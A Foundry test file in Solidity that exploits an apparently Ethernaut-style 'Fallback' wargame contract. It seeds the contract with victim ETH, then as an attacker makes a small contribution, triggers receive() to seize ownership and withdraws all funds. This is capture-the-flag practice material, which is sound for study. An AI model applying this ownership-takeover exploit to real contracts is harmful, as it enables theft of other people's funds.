// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fallbackContract;

    address attacker = address(1);

    function setUp() public {
        fallbackContract = new Fallback();

        // contract ko ETH do (simulate victim funds)
        vm.deal(address(this), 5 ether);
        // payable(address(fallbackContract)).transfer(5 ether);
        // low-level call (bypass logic issues)
        (bool success,) = address(fallbackContract).call{value: 5 ether}("");
        require(success);
    }

    function testExploit() public {
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // Step 1: contribute
        fallbackContract.contribute{value: 0.0001 ether}();

        // Step 2: trigger receive()
        (bool success,) = address(fallbackContract).call{value: 0.0001 ether}("");
        require(success, "call failed");

        // Step 3: check owner
        assertEq(fallbackContract.owner(), attacker);

        // Step 4: withdraw funds
        fallbackContract.withdraw();

        vm.stopPrank();
    }
}